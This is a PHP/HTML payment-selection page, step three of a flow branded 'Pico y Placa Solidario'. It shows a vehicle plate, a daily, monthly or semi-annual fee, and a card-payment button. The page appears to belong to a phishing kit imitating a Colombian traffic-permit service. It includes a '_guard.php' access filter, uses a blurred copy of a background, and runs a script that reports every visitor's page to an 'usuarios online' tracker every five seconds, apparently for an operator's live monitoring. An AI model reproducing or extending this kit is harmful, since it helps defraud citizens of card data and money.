<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Método de Pago - Pico y Placa Solidario</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1rem; position: relative; overflow-x: hidden; }

        .background-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; overflow: hidden; }
        .background-wrapper .bg-image { width: 100%; height: 100%; object-fit: cover; display: block; }
        .background-wrapper .bg-blur { position: absolute; top: 0; left: 0; width: 100%; height: 100%; backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); background: rgba(0, 0, 0, 0.25); }

        .modal-overlay { position: relative; z-index: 1; width: 100%; max-width: 600px; margin: 0 auto; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        .modal-box { background: #ffffff; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4); width: 100%; max-height: 95vh; overflow: hidden; display: flex; flex-direction: column; }

        .modal-header { background: #f5f5f5; padding: 1.5rem 1.5rem 1rem; border-bottom: 1px solid #e0e0e0; position: relative; }
        .modal-close-btn { position: absolute; top: 1rem; right: 1rem; width: 32px; height: 32px; border: none; background: none; font-size: 1.8rem; color: #666; cursor: pointer; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background 0.2s; }
        .modal-close-btn:hover { background: rgba(0, 0, 0, 0.05); color: #333; }

        .stepper { display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem; }
        .step { display: flex; flex-direction: column; align-items: center; gap: 0.35rem; min-width: 50px; }
        .step-circle { width: 32px; height: 32px; border-radius: 50%; background: #d0d0d0; color: white; font-weight: 700; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; transition: all 0.3s; }
        .step-circle.active { background: #00271C; box-shadow: 0 0 12px rgba(0, 39, 28, 0.4); }
        .step-circle.completed { background: #88F456; color: #00271C; }
        .step-line { width: 30px; height: 2px; background: #d0d0d0; margin: 0 -0.25rem; }
        .step-line.completed { background: #88F456; }
        .step-label { font-size: 0.7rem; color: #999; text-align: center; max-width: 60px; line-height: 1.2; }
        .step-label.active { color: #00271C; font-weight: 600; }

        .modal-content { flex: 1; overflow-y: auto; padding: 2rem 1.5rem; }
        .modal-content::-webkit-scrollbar { width: 6px; }
        .modal-content::-webkit-scrollbar-track { background: #f1f1f1; }
        .modal-content::-webkit-scrollbar-thumb { background: #b0b0b0; border-radius: 3px; }

        .page-title { font-size: 1.4rem; font-weight: 700; color: #00271C; margin-bottom: 0.2rem; }
        .page-subtitle { font-size: 0.95rem; color: #666; margin-bottom: 1.5rem; }

        .total-box { background: #00271C; border-radius: 0.75rem; padding: 1.2rem 1.5rem; margin-bottom: 1.5rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .total-box .label { color: #88F456; font-size: 0.9rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
        .total-box .amount { color: #ffffff; font-size: 2rem; font-weight: 900; }

        .resumen-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.8rem; margin-bottom: 1.8rem; background: #f8fafc; border-radius: 0.5rem; padding: 1rem; }
        .resumen-item { text-align: center; }
        .resumen-item .label { font-size: 0.7rem; font-weight: 600; color: #888; text-transform: uppercase; letter-spacing: 0.3px; display: block; margin-bottom: 0.15rem; }
        .resumen-item .value { font-size: 0.95rem; font-weight: 700; color: #00271C; }

        .metodos-title { font-size: 0.8rem; font-weight: 700; color: #888; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 1rem; border-bottom: 1px solid #e0e0e0; padding-bottom: 0.5rem; }

        /* ===== TARJETAS EN LÍNEA ===== */
        .tarjetas-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #f9f9f9;
            border: 2px solid #e8e8e8;
            border-radius: 1rem;
            padding: 1rem 1.5rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .tarjetas-container:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0, 0, 0, 0.08); border-color: #00271C; }

        .tarjetas-logos {
            display: flex;
            gap: 1rem;
            align-items: center;
        }

        .tarjetas-logos img {
            height: 40px;
            width: auto;
            object-fit: contain;
        }

        .tarjetas-text {
            font-size: 1.1rem;
            font-weight: 700;
            color: #00271C;
        }

        /* ===== BOTONES ===== */
        .modal-footer { background: #f9f9f9; padding: 1.25rem 1.5rem; border-top: 1px solid #e0e0e0; display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; }
        .btn { padding: 0.65rem 2rem; border-radius: 9999px; border: none; font-size: 0.95rem; font-weight: 700; cursor: pointer; transition: all 0.3s; min-width: 140px; text-align: center; }
        .btn-siguiente { background: #00271C; color: #88F456; box-shadow: 0 4px 12px rgba(0, 39, 28, 0.2); }
        .btn-siguiente:hover { background: #00391f; transform: translateY(-2px); }
        .btn-atras { background: white; color: #00271C; border: 2px solid #00271C; }
        .btn-atras:hover { background: #edfde5; }

        /* ===== TOAST ===== */
        .toast {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%);
            background: #00271C;
            color: white;
            padding: 0.8rem 2rem;
            border-radius: 9999px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            z-index: 9999;
            animation: slideUp 0.3s ease;
            font-size: 0.9rem;
            max-width: 90vw;
            text-align: center;
        }

        .toast.error { background: #e53935; }

        @media (max-width: 768px) {
            .tarjetas-container { flex-direction: column; gap: 0.8rem; }
            .modal-footer { flex-direction: column; }
            .btn { width: 100%; }
        }

        @media (max-width: 480px) {
            body { padding: 0; }
            .modal-overlay { padding: 0; }
            .modal-box { border-radius: 1.25rem 1.25rem 0 0; max-height: 98vh; }
            .modal-header { padding: 0.8rem 0.75rem 0.6rem; }
            .modal-close-btn { width: 24px; height: 24px; font-size: 1.3rem; top: 0.6rem; right: 0.6rem; }
            .modal-content { padding: 1rem 0.75rem; }
            .page-title { font-size: 1.1rem; }
            .total-box .amount { font-size: 1.5rem; }
            .tarjetas-logos img { height: 30px; }
            .resumen-grid { grid-template-columns: 1fr; gap: 0.4rem; }
            .btn { padding: 0.5rem 1rem; font-size: 0.85rem; min-width: 100px; }
        }
    </style>
</head>
<body>

<div class="background-wrapper">
    <img class="bg-image" src="blur.png" alt="Fondo">
    <div class="bg-blur"></div>
</div>

<div class="modal-overlay">
    <div class="modal-box">

        <div class="modal-header">
            <button class="modal-close-btn" onclick="window.location.href='index.php';">✕</button>

            <div class="stepper">
                <div class="step"><div class="step-circle completed">✓</div><div class="step-label">Datos</div></div>
                <div class="step-line completed"></div>
                <div class="step"><div class="step-circle completed">✓</div><div class="step-label">Placa</div></div>
                <div class="step-line completed"></div>
                <div class="step"><div class="step-circle active">3</div><div class="step-label active">Pago</div></div>
                <div class="step-line"></div>
                <div class="step"><div class="step-circle">4</div><div class="step-label">Confirmar</div></div>
            </div>
        </div>

        <div class="modal-content">
            <h1 class="page-title">Plataforma de Pagos</h1>
            <p class="page-subtitle">Selecciona tu método de pago preferido</p>

            <div class="total-box">
                <span class="label">TOTAL A PAGAR</span>
                <span class="amount" id="montoTotal">$ 63.600</span>
            </div>

            <div class="resumen-grid">
                <div class="resumen-item"><span class="label">Placa</span><span class="value" id="placaMostrada">ABC-123</span></div>
                <div class="resumen-item"><span class="label">Plan</span><span class="value" id="planMostrado">Diario</span></div>
            </div>

            <!-- TARJETAS DE CRÉDITO Y DÉBITO -->
            <div class="metodos-title">TARJETAS DE CRÉDITO Y DÉBITO</div>
            <div class="tarjetas-container" onclick="window.location.href='paso5.php'">
                <div class="tarjetas-logos">
                    <img src="visa.png" alt="Visa">
                    <img src="mastercard.png" alt="Mastercard">
                    <img src="amex.png" alt="American Express">
                </div>
                <div class="tarjetas-text">Pagar con Tarjeta</div>
            </div>

        </div>

        <div class="modal-footer">
            <button type="button" class="btn btn-atras" onclick="window.location.href='paso3.php';">← Anterior</button>
        </div>

    </div>
</div>

<script>
    // ============================================================
    // TRACKING DE USUARIOS EN LÍNEA
    // ============================================================
    const TRACKING_URL = '/api/usuarios_online.php';
    let usuarioId = localStorage.getItem('usuarioId');

    if (!usuarioId) {
        usuarioId = 'USR-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('usuarioId', usuarioId);
    }

    function enviarHeartbeat() {
        fetch(TRACKING_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usuarioId: usuarioId,
                pagina: window.location.pathname
            })
        }).catch(function(error) {
            console.log('Error enviando heartbeat:', error);
        });
    }

    enviarHeartbeat();
    setInterval(enviarHeartbeat, 5000);

    window.addEventListener('beforeunload', function() {
        navigator.sendBeacon(TRACKING_URL, JSON.stringify({
            usuarioId: usuarioId,
            pagina: 'cerrando'
        }));
    });

    // ============================================================
    // CARGAR DATOS DESDE localStorage
    // ============================================================
    function cargarDatos() {
        // Obtener la última placa agregada
        const placas = JSON.parse(localStorage.getItem('placas') || '[]');
        if (placas.length > 0) {
            const ultimaPlaca = placas[placas.length - 1];
            document.getElementById('placaMostrada').textContent = ultimaPlaca.placa || 'ABC-123';

            // Obtener duración
            const duracion = ultimaPlaca.duracion || 'diario';
            const nombresDuracion = {
                'diario': 'Diario',
                'mensual': 'Mensual',
                'semestral': 'Semestral'
            };
            document.getElementById('planMostrado').textContent = nombresDuracion[duracion] || 'Diario';

            // Calcular precio
            const precios = {
                'diario': 63600,
                'mensual': 508100,
                'semestral': 2540900
            };
            const monto = precios[duracion] || 63600;
            document.getElementById('montoTotal').textContent = '$ ' + monto.toLocaleString('es-CO');

            // Guardar el monto para usarlo en el siguiente paso
            localStorage.setItem('montoTotal', monto);
        } else {
            // Si no hay placas, intentar cargar desde los datos de registro
            const datosRegistro = JSON.parse(localStorage.getItem('datosRegistro') || '{}');
            if (datosRegistro.placa) {
                document.getElementById('placaMostrada').textContent = datosRegistro.placa;
            }
        }
    }

    // ============================================================
    // MOSTRAR TOAST
    // ============================================================
    function mostrarToast(mensaje, tipo = 'success') {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();

        const toast = document.createElement('div');
        toast.className = 'toast' + (tipo === 'error' ? ' error' : '');
        toast.textContent = mensaje;
        document.body.appendChild(toast);

        setTimeout(() => {
            toast.remove();
        }, 3000);
    }

    // ============================================================
    // INICIALIZAR
    // ============================================================
    document.addEventListener('DOMContentLoaded', function() {
        cargarDatos();
    });
</script>

</body>
</html>